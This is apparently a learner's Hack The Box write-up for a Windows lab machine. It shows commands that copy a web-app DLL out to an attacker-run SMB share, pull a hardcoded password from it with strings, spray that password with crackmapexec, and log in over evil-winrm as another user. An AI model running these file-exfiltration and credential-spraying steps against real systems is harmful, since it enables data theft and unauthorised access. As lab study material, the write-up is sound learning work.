
![[Pasted image 20240927040947.png]]

Let's copy the .dll and do some reverse engineering.


So to copy the file let's fire up a SMB share and copy the .dll their
```
impacket-smbserver Hackthebox $(pwd) -smb2support -user testing -password testing
```

Get a NEW PS-Drive 
So to do that we have to put the user and password in Credential Object.
```
$pass = convertto-securestring 'testing' -AsPlainText -Force 
```

```
$cred= New-Object System.Management.Automation.PSCredential('testing', $pass)
```

```
New-PSDrive -Name testing -PSProvider FileSystem -Credential $cred -Root \\10.10.16.6\Hackthebox
```

![[Pasted image 20240927042918.png]]


```
Copy-Item "C:\inetpub\wwwroot\bin\MultimasterAPI.dll" -Destination "testing"
```


```
copy C:\inetpub\wwwroot\bin\MultimasterAPI.dll testing
```


```
Copy-Item "C:\inetpub\wwwroot\bin\MultimasterAPI.dll" -Destination "C:\Users\alcibiades\Documents"
```


SO now i finally know why to look into this directory as this questions raised 1st thing in my mind.
![[Pasted image 20241002023222.png]]

So i was right we have to copy the file were we have write permission and u have guessed it right in the windows spoolers directory.

```
copy MultimasterAPI.dll C:\Windows\System32\spool\drivers\color
```
![[Pasted image 20241002023910.png]]

So the file has been copied and will try to extract the password from it
Before copying it in windows or running ilspy in kali will use strings against it
It's something new that i am learning
```
strings MultimasterAPI.dll
```


Got nothing when we run it but it has some encoding techniques let's look into it
```
strings -e l MultimasterAPI.dll
```
![[Pasted image 20241002024952.png]]


```
finder
```

```
D3veL0pM3nT!
```


We got the password but i don't the username where we can use it but it's related to database which could be sql user.

Learnt a new thing  more of a mistake i was doing

![[Pasted image 20241002030046.png]]
```
crackmapexec smb 10.10.10.179 -u nn_user.txt -p D3veL0pM3nT!
```

It's good that i am making this mistakes cuz i don't want to do that in real exam and loss the initial change of getting into the network.
![[Pasted image 20241002030135.png]]


Got the user
```
sbauer
```


```
evil-winrm -u 'sbauer' -p 'D3veL0pM3nT!' -i 10.10.10.179
```

I think now we can run the bloodhound and all or have to do escalation not sure about it.
SO it's not always escalation here we can see that we got the password of another user means we are doing lateral movement.


